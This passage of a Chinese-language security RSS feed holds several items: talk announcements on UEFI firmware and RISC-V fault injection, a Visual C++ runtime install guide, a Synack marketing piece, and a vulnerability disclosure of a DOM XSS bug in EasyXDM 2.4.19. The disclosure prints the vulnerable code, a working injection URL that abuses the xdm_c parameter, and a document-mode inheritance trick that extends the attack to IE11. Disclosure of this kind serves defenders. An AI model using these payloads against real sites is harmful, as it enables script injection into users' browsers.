        <link>http://localhost:1313/p/%E6%88%91%E5%9C%A8blackhat-2021%E5%92%8Cdefcon29%E7%9A%84%E6%BC%94%E8%AE%B2%E8%81%9A%E7%84%A6uefi%E5%9B%BA%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E4%B8%8Erisc-v%E8%8A%AF%E7%89%87%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Sun, 03 Aug 2025 21:25:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%88%91%E5%9C%A8blackhat-2021%E5%92%8Cdefcon29%E7%9A%84%E6%BC%94%E8%AE%B2%E8%81%9A%E7%84%A6uefi%E5%9B%BA%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E4%B8%8Erisc-v%E8%8A%AF%E7%89%87%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;p&gt;今年我将展示两项突破性安全研究成果：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BlackHat 2021&lt;/strong&gt;&lt;br&gt;
演讲主题：《守护UEFI生态系统：固件供应链的硬编码困境》&lt;br&gt;
合作研究者：Alex Tereshkin与Alex Matrosov&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://example.com/blackhat_abstract&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;摘要链接&lt;/a&gt;&lt;br&gt;
聚焦UEFI固件供应链中的安全盲区，揭示硬编码机制带来的系统性风险&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DefCon 29&lt;/strong&gt;&lt;br&gt;
演讲主题：《RISC-V芯片故障注入：MTVEC寄存器污染加固指令集架构》&lt;br&gt;
合作研究者：Alex Matrosov&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://example.com/defcon_abstract&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;摘要链接&lt;/a&gt;&lt;br&gt;
首次公开针对RISC-V架构的物理层攻击技术，提出通过MTVEC寄存器异常实现ISA强化的创新方案&lt;/p&gt;
&lt;p&gt;这两个议题均涉及底层硬件安全的前沿领域。会议期间若有意交流，欢迎联系共酌！&lt;br&gt;
——Adam&lt;/p&gt;
&lt;p&gt;&lt;em&gt;分类：漏洞挖掘/利用技术/安全理念/会议动态&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用文档模式继承漏洞：EasyXDM 2.4.19 DOMXSS分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%96%87%E6%A1%A3%E6%A8%A1%E5%BC%8F%E7%BB%A7%E6%89%BF%E6%BC%8F%E6%B4%9Eeasyxdm-2.4.19-domxss%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 21:08:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%96%87%E6%A1%A3%E6%A8%A1%E5%BC%8F%E7%BB%A7%E6%89%BF%E6%BC%8F%E6%B4%9Eeasyxdm-2.4.19-domxss%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;滥用文档模式继承easyxdm-2419-domxss漏洞分析&#34;&gt;滥用文档模式继承：EasyXDM 2.4.19 DOMXSS漏洞分析
&lt;/h1&gt;&lt;p&gt;本文将详细解释EasyXDM 2.4.19版本中存在的XSS问题。该问题已向开发者报告并在后续版本中修复。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用户应立即升级至EasyXDM 2.4.20版本&lt;/strong&gt;&lt;br&gt;
安全更新发布地址：&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://github.com/oyvindkinsey/easyXDM/releases/tag/2.4.20&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/oyvindkinsey/easyXDM/releases/tag/2.4.20&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;该漏洞的触发需要特殊技巧：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅影响MSIE浏览器&lt;/li&gt;
&lt;li&gt;要求文档模式为旧版本（IE7或5）&lt;/li&gt;
&lt;li&gt;漏洞存在于仅旧版浏览器才会执行的代码路径中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;漏洞核心位于&lt;code&gt;createElement()&lt;/code&gt;函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HAS_NAME_PROPERTY_BUG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;frame&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;iframe name=\&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;props&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\&amp;#34;/&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;HAS_NAME_PROPERTY_BUG&lt;/code&gt;变量的检测逻辑：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;testForNamePropertyBug&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;form&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;input&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;IFRAME_PREFIX&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;TEST&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;channelId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;HAS_NAME_PROPERTY_BUG&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;elements&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;removeChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;测试页面验证：&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://vulnerabledoma.in/easyxdm/name_property_test.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://vulnerabledoma.in/easyxdm/name_property_test.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;漏洞验证
&lt;/h2&gt;&lt;p&gt;在IE7模式下访问以下URL可触发alert弹窗：&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://vulnerabledoma.in/easyxdm/2.4.19_index.html?xdm_e=http%3A%2F%2Fvulnerabledoma.in&amp;amp;xdm_c=%22onload%3dalert%28document.domain%29//&amp;amp;xdm_p=0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://vulnerabledoma.in/easyxdm/2.4.19_index.html?xdm_e=http%3A%2F%2Fvulnerabledoma.in&amp;xdm_c=%22onload%3dalert(document.domain)//&amp;xdm_p=0&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;文档模式继承技术&#34;&gt;文档模式继承技术
&lt;/h2&gt;&lt;p&gt;通过特殊技巧扩展攻击影响范围：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;x-ua-compatible&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;IE=5&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//vulnerabledoma.in/easyxdm/2.4.19_index.html?...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;关键发现：当使用&lt;code&gt;message/rfc822&lt;/code&gt;内容类型时，IE会强制继承文档模式：&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://l0.cm/easyxdm/poc.eml&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://l0.cm/easyxdm/poc.eml&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;影响评估&#34;&gt;影响评估
&lt;/h2&gt;&lt;p&gt;该技术使得原本仅影响IE7模式的问题可影响所有IE11用户，显著扩大了漏洞影响范围。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Posted by Masato Kinugawa at 6:30 AM&lt;br&gt;
Labels: IE, OSS, Security, XSS&lt;/p&gt;
</description>
        </item>
        <item>
        <title>如何安装Microsoft Visual C&#43;&#43; 2015运行时环境</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85microsoft-visual-c-2015%E8%BF%90%E8%A1%8C%E6%97%B6%E7%8E%AF%E5%A2%83/</link>
        <pubDate>Sun, 03 Aug 2025 20:52:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85microsoft-visual-c-2015%E8%BF%90%E8%A1%8C%E6%97%B6%E7%8E%AF%E5%A2%83/</guid>
        <description>&lt;h1 id=&#34;如何安装microsoft-visual-c-2015运行时环境&#34;&gt;如何安装Microsoft Visual C++ 2015运行时环境
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Lawrence Abrams&lt;/strong&gt;&lt;br&gt;
2020年9月1日&lt;br&gt;
阅读量：300,772次&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;当您启动程序时若出现&amp;quot;需要Microsoft Visual C++ 2015运行时环境&amp;quot;的错误提示，本教程将指导您安装该组件以恢复程序运行。&lt;/p&gt;
&lt;p&gt;开发者使用Microsoft Visual Studio 2015创建Windows程序时，会依赖特定的动态链接库(DLL)。这些DLL通过Microsoft Visual C++ 2015运行时环境分发，若未安装该组件，用户将遭遇DLL缺失或需安装运行时的错误提示。&lt;/p&gt;
&lt;p&gt;以热门游戏《Valorant》为例，其某次更新未包含该运行时组件，导致更新后游戏无法启动并显示错误：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;运行此程序需要以下组件：Microsoft Visual C++ 2015运行时环境&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;安装步骤&#34;&gt;安装步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;访问&lt;a class=&#34;link&#34; href=&#34;https://aka.ms/vs/16/release/vc_redist.x64.exe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Microsoft Visual C++ 2015可再发行组件页面&lt;/a&gt;，点击&amp;quot;下载&amp;quot;按钮&lt;/li&gt;
&lt;li&gt;选择适用于您系统的版本（32位或64位）。不确定版本？&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/tutorials/32-bit-or-64-bit/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;参考此教程判断&lt;/a&gt;&lt;br&gt;
&lt;em&gt;建议同时安装x86和x64版本以避免未来兼容性问题&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;下载完成后双击运行&lt;code&gt;vc_redist.x64.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;勾选&amp;quot;我同意许可条款&amp;quot;后点击&amp;quot;安装&amp;quot;按钮&lt;/li&gt;
&lt;li&gt;若出现用户账户控制提示，点击&amp;quot;是&amp;quot;或&amp;quot;允许&amp;quot;&lt;/li&gt;
&lt;li&gt;安装完成后将显示成功提示&lt;/li&gt;
&lt;li&gt;重复上述步骤安装&lt;code&gt;vc_redist.x86.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;修复已安装的运行时&#34;&gt;修复已安装的运行时
&lt;/h2&gt;&lt;p&gt;若运行时已存在，运行安装程序可选择&amp;quot;修复&amp;quot;选项。完成上述操作后，原先报错的程序应可正常运行。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;延伸阅读&#34;&gt;延伸阅读
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/tutorials/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows 10全屏开始菜单设置方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/tutorials/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows 11管理员权限PowerShell开启指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/tutorials/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;修复VCRUNTIME140.dll缺失错误&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;搜索更多教程：&lt;br&gt;
• &lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/tutorials/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Tor浏览器访问暗网指南&lt;/a&gt;&lt;br&gt;
• &lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/tutorials/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows 11内核模式硬件强制堆栈保护启用方法&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>效率与影响：Synack集成如何提升安全成果</title>
        <link>http://localhost:1313/p/%E6%95%88%E7%8E%87%E4%B8%8E%E5%BD%B1%E5%93%8Dsynack%E9%9B%86%E6%88%90%E5%A6%82%E4%BD%95%E6%8F%90%E5%8D%87%E5%AE%89%E5%85%A8%E6%88%90%E6%9E%9C/</link>
        <pubDate>Sun, 03 Aug 2025 20:35:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%95%88%E7%8E%87%E4%B8%8E%E5%BD%B1%E5%93%8Dsynack%E9%9B%86%E6%88%90%E5%A6%82%E4%BD%95%E6%8F%90%E5%8D%87%E5%AE%89%E5%85%A8%E6%88%90%E6%9E%9C/</guid>
        <description>&lt;p&gt;“效率”可能是2025年的年度词汇。安全领导者们面临着在不增加人手的情况下提升影响力的压力，必须更快行动、更智能地修复漏洞。这正是集成的力量所在。&lt;/p&gt;
&lt;p&gt;通过将Synack的渗透测试即服务(PTaaS)平台与现有安全生态系统（从攻击面管理(ASM)工具到漏洞管理和工单平台）连接起来，组织可以将测试重点放在风险最高的地方，同时充分利用预算。Synack的集成可以自动化关键流程，加速修复，提高补丁效率，而无需增加人手。&lt;/p&gt;
&lt;p&gt;将Synack集成到更广泛工具集中的组织表现始终优于那些将测试作为独立活动的组织。使用技术集成的Synack客户在第一年内将平均修复时间缩短了63%以上，补丁效率提高了近20%。（补丁效率衡量的是正确修复漏洞所需的次数。）&lt;/p&gt;
&lt;p&gt;数据不会说谎：孤立的测试无法扩展。传统的渗透测试长期以来一直是一种“打勾”式的年度活动，与负责修复漏洞的工具和团队脱节。Synack的持续测试模式已经是一个飞跃，但集成更进一步。&lt;/p&gt;
&lt;p&gt;当Synack与Palo Alto Networks Cortex Xpanse ASM和Tenable漏洞管理等工具连接时，组织可以发现更多真实的攻击面，并优先处理最重要的问题。当Synack的结果无缝流入Jira、Splunk和ServiceNow等平台时，漏洞可以更快、更精确地解决，且手动工作量大大减少。&lt;/p&gt;
&lt;p&gt;以下是实际案例：&lt;/p&gt;
&lt;h3 id=&#34;敏捷安全从集成开始&#34;&gt;敏捷安全从集成开始
&lt;/h3&gt;&lt;p&gt;一位金融行业的Synack客户希望简化其软件开发生命周期(SDLC)中安全漏洞的处理方式。通过将Synack与Jira集成，他们将修复工作纳入了敏捷流程，而不是事后补救。结果如何？平均修复时间提高了265%。更重要的是，得益于Synack Red Team（一个由1500多名全球安全研究人员组成的专业团队）的深入指导，漏洞在第一次修复时就得到了正确处理。&lt;/p&gt;
&lt;h3 id=&#34;从检测到行动一览无余&#34;&gt;从检测到行动——一览无余
&lt;/h3&gt;&lt;p&gt;另一家企业客户将Synack的测试结果导入其Splunk环境——这是其安全运营中心(SOC)依赖的单一视图。这一集成意味着安全工程师可以立即发现并处理可利用的漏洞，而无需在工具之间切换。与之前的工作流程相比，他们的软件漏洞修复时间缩短了3倍以上。&lt;/p&gt;
&lt;h3 id=&#34;测试最重要的资产&#34;&gt;测试最重要的资产
&lt;/h3&gt;&lt;p&gt;安全有效性始于知道该测试什么。一位使用Palo Alto Networks Cortex Xpanse进行攻击面管理的客户将其与Synack PTaaS连接，以弥补可见性差距。集成揭示了1700个额外的、之前未测试的资产，允许快速分类并分配给Synack Red Team。这不仅仅是更多的覆盖范围，而是更智能的基于风险的优先级排序。&lt;/p&gt;
&lt;h3 id=&#34;集中式漏洞管理真实成果&#34;&gt;集中式漏洞管理，真实成果
&lt;/h3&gt;&lt;p&gt;对于使用ServiceNow漏洞管理的团队，Synack数据直接流入其中心平台。这意味着不再需要在系统之间切换以关联和协调修复。启用此集成的客户平均修复时间提高了62%，补丁效率提高了26%——证明简化的工作流程可以带来更强的安全性。&lt;/p&gt;
&lt;h3 id=&#34;集成测试加速成果&#34;&gt;集成测试=加速成果
&lt;/h3&gt;&lt;p&gt;归根结底，集成不仅仅是一种便利：它是一种催化剂。通过将Synack PTaaS嵌入到安全堆栈中，您可以赋能团队更快、更自信地完成更多工作。随着安全计划的成熟和左移，自动化和集成不再是可选的——它们是必不可少的。&lt;/p&gt;
&lt;p&gt;准备好了解Synack如何融入您的生态系统并放大您的影响力了吗？&lt;a class=&#34;link&#34; href=&#34;https://www.synack.com/partners/technology-partners/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;点击此处&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2022年CTI-EU演讲：移动监控植入威胁态势与防御策略</title>
        <link>http://localhost:1313/p/2022%E5%B9%B4cti-eu%E6%BC%94%E8%AE%B2%E7%A7%BB%E5%8A%A8%E7%9B%91%E6%8E%A7%E6%A4%8D%E5%85%A5%E5%A8%81%E8%83%81%E6%80%81%E5%8A%BF%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5/</link>
        <pubDate>Sun, 03 Aug 2025 20:14:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2022%E5%B9%B4cti-eu%E6%BC%94%E8%AE%B2%E7%A7%BB%E5%8A%A8%E7%9B%91%E6%8E%A7%E6%A4%8D%E5%85%A5%E5%A8%81%E8%83%81%E6%80%81%E5%8A%BF%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5/</guid>
        <description>&lt;h3 id=&#34;会议背景&#34;&gt;会议背景
&lt;/h3&gt;&lt;p&gt;2022年12月，我有幸在欧洲网络安全局（ENISA）主办的2022网络威胁情报大会（CTI-EU 2022）上进行闪电演讲。该会议汇聚了公共与私营部门的CTI专家，议题涵盖威胁情报协作、行业挑战等核心内容。&lt;/p&gt;
&lt;h3 id=&#34;演讲主题&#34;&gt;演讲主题
&lt;/h3&gt;&lt;p&gt;经与主办方讨论，最终选定**《移动监控植入威胁态势与防御对策》**作为演讲主题。该议题基于当时对移动端监控技术的研究成果，重点分析植入式攻击的防御框架。&lt;/p&gt;
&lt;h3 id=&#34;技术交流价值&#34;&gt;技术交流价值
&lt;/h3&gt;&lt;p&gt;虽然闪电演讲无法深入技术细节，但现场交流环节产生了诸多有价值讨论。若需获取演讲幻灯片或对特定技术点（如植入检测、行为分析等）有深入探讨需求，欢迎直接联系。此外，我也乐意协助同行研究者进行技术复核。&lt;/p&gt;
&lt;h3 id=&#34;资料获取&#34;&gt;资料获取
&lt;/h3&gt;&lt;p&gt;会议白皮书级别（TLP:WHITE）演讲资料暂未公开，但可通过&lt;a class=&#34;link&#34; href=&#34;https://example.com/threat-landscape-slides.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;此链接&lt;/a&gt;下载我的演讲幻灯片副本。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>苹果技术上可配合FBI解锁iPhone 5C - 安全专家深度解析</title>
